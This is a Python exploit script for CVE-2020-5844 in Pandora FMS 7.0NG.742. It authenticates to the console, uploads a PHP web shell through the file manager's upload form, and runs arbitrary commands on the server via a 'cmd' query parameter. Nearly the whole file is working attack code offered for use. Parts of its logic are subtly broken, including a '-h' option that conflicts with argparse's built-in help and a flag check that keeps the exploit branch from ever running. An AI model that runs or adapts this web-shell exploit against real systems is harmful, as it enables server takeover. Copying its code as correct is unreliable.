#!/usr/bin/env python3
# Title: Pandora FMS v7.0NG.742 Exploit
# Software Link: https://sourceforge.net/projects/pandora/files/Pandora%20FMS%207.0NG/742_FIX_PERL2020/Tarball/pandorafms_server-7.0NG.742_FIX_PERL2020.tar.gz
# CVE: CVE-2020-5844
# Description: index.php?sec=godmode/extensions&sec2=extensions/files_repo in Pandora FMS v7.0 NG allows authenticated administrators to upload malicious PHP scripts, and execute them via base64 decoding of the file location. This affects v7.0NG.742_FIX_PERL2020.
# Author: https://github.com/1Gould

import argparse
import requests
import sys
import urllib.parse
import re


def main(args):
    pass


def help():
    print(
        r"""CVE-2020-5844 (Pandora FMS v7.0NG.742) - Remote Code Execution

Usage:
  python3 exploit-CVE-2020-5844.py -t <target-IP>:<target-port> --check
  python3 exploit-CVE-2020-5844.py -t <target-IP>:<target-port> -u <username> -p <password>
  python3 exploit-CVE-2020-5844.py -t <target-IP>:<target-port> -s <PHPSESSID>
  python3 exploit-CVE-2020-5844.py -t <target-IP>:<target-port> -s <PHPSESSID> [-c <custom-command>]
  python3 exploit-CVE-2020-5844.py -t <target-IP>:<target-port> -s <PHPSESSID> [-f <file.php>]
  python3 exploit-CVE-2020-5844.py -h

Options:
  -t    Target host and port. Provide target IP address and port.
  -u    Target username. Provide username to log in to Pandora FMS.
  -p    Target password. Provide password to log in to Pandora FMS.
  -s    Target valid PHP session ID. No username or password needed. (Optional)
  -c    Custom command mode. Provide command to execute. (Optional)
  -f    Provide a custom file name. (Optional)
  -h    Show this help menu.
"""
    )
    exit()


def check(ip, port):
    url = f"http://{ip}:{port}/pandora_console/index.php"
    response = requests.get(url)

    if not response.ok:
        print("Connection failed")
        return "unknown"

    if "Pandora" not in response.text:
        print("Not a Pandora FMS instance")
        return "unknown"

    pandora_version_match = re.search(r'<div id="ver_num">v(.*?)<\/div>', response.text)
    if pandora_version_match:
        pandora_version = pandora_version_match.group(1)
        print(f"Pandora FMS version {pandora_version}")
        if pandora_version <= "7.0NG":
            print("This version is vulnerable.")
            return "vulnerable"
    print("This version is not vulnerable.")
    return "not vulnerable"


def exploit(ip, port, session, filename, command):
    headers = {
        "Host": f"{ip}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------308045185511758964171231871874",
        "Content-Length": "1289",
        "Connection": "close",
        "Referer": f"http://{ip}:{port}/pandora_console/index.php?sec=gsetup&sec2=godmode/setup/file_manager",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
    }
    params = (("sec", "gsetup"), ("sec2", "godmode/setup/file_manager"))
    cookies = {"PHPSESSID": session}
    data = f'-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET[\'cmd\']);?>\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="umask"\r\n\r\n\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="decompress_sent"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="go"\r\n\r\nGo\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="real_directory"\r\n\r\n/var/www/pandora/pandora_console/images\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="directory"\r\n\r\nimages\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash"\r\n\r\n6427eed956c3b836eb0644629a183a9b\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="hash2"\r\n\r\n594175347dddf7a54cc03f6c6d0f04b4\r\n-----------------------------308045185511758964171231871874\r\nContent-Disposition: form-data; name="upload_file_or_zip"\r\n\r\n1\r\n-----------------------------308045185511758964171231871874--\r\n'
    try:
        response = requests.post(
            f"http://{ip}:{port}/pandora_console/index.php",
            headers=headers,
            params=params,
            cookies=cookies,
            data=data,
            verify=False,
        )
    except:
        print("Could not connect.")
        exit()

    if command is None:
        print(
            f"Web Shell: http://{ip}:{port}/pandora_console/images/{filename}?cmd=whoami\n"
        )
    else:
        response = requests.get(
            f"http://{ip}:{port}/pandora_console/images/{filename}?cmd={urllib.parse.quote_plus(command)}"
        )
        print("Success. Printing response: \n")
        print(response.text)

    return


def get_session(ip, port, username, password):
    url = f"http://{ip}:{port}/pandora_console/index.php?login=1"
    data = {"nick": {username}, "pass": {password}, "login_button": "login"}

    response = requests.post(url, data=data)

    if response.ok:
        cookies = response.cookies
        if "PHPSESSID" in cookies:
            print("Successfully authenticated!")
            return cookies.get("PHPSESSID")
        elif "login_move" in response.text():
            print("Invalid Credentials.")
            exit()
        else:
            print("Error retrieving cookie!")
            exit()
    else:
        print("Authentication failed!")
        exit()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2020-5844 Pandora FMS v7.0NG.742 Exploit"
    )
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="Target IP Address and Port. Ex. 10.10.10.10:8000",
    )
    parser.add_argument(
        "-u", "--username", required=True, help="The username to authenticate with"
    )
    parser.add_argument(
        "-p", "--password", required=True, help="The password to authenticate with"
    )
    parser.add_argument(
        "-s",
        "--session",
        type=str,
        metavar="PHPSESSID",
        help="Target valid PHP session ID. No username or password needed. (Optional)",
    )
    parser.add_argument(
        "-c",
        "--command",
        type=str,
        metavar="COMMAND",
        help="Custom command mode. Provide command to execute. (Optional)",
    )
    parser.add_argument(
        "-f",
        "--file",
        type=str,
        help="Custom file name for the PHP web shell. (Optional)",
    )
    parser.add_argument(
        "--check",
        action="store_true",
        help="Check if the target is vulnerable without exploiting. (Optional)",
    )
    parser.add_argument("-h", "--help", help="Display the help menu.")
    args = parser.parse_args()

    if args.help:
        help()

    target = args.target.split(":")
    ip = target[0]
    port = target[1]
    php_session = args.session
    username = args.username
    password = args.password
    command = args.command
    filename = args.file
    if filename is None:
        filename = "shell.php"

    # Store the status of the application
    status = check(ip, port)

    if args.check:
        print("Checking if target is vulnerable...: ")
        print(f"Target status: {status}")

    if ((username and password) or php_session is not None) and (
        status is "vulnerable" and args.check is None
    ):
        # If the session is not provided, grab one with a valid username and password
        if php_session is None:
            php_session = get_session(ip, port, username, password)

        exploit(ip, port, php_session, filename, command)
    else:
        print("Please provide the correct options.")
        exit()

    main(args)
